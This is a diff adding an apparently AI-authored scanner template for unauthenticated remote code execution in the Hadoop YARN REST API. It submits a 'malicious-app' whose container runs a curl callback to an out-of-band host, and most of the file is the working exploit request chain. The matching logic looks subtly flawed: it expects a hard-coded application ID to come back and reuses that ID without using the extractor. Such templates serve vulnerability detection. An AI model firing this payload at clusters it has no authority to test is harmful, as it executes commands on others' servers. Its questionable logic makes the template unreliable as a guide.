@@ -1,0 +1,65 @@
+id: hadoop-yarn-rpc-rce
+info:
+  name: Hadoop Yarn RPC Service Unauthorized Access RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yarn is a Hadoop resource manager. It is a general resource management system and scheduling platform that can provide unified resource management and scheduling for upper-level applications.
+    The Hadoop Yarn RPC service (open to the outside world by default) has an RCE vulnerability caused by unauthorized access. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.
+  tags: command-execution
+http:
+  - raw:
+    - |
+        POST /ws/v1/cluster/apps/new-application HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"application-id": "application_1234567890123_0001"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "application-id"
+          - "application_1234567890123_0001"
+        part: body
+  - raw:
+    - |
+        POST /ws/v1/cluster/apps HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "application-id": "application_1234567890123_0001",
+          "application-name": "malicious-app",
+          "am-container-spec": {
+            "commands": {
+              "command": "curl http://{{interactsh-url}}"
+            }
+          },
+          "application-type": "MAPREDUCE"
+        }
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "accepted"
+          - "application_1234567890123_0001"
+        part: body
+    extractors:
+      - type: regex
+        regex:
+          - "application_[0-9]+_[0-9]+"
+        group: 0
+  - raw:
+    - |
+        GET /ws/v1/cluster/apps/application_1234567890123_0001 HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
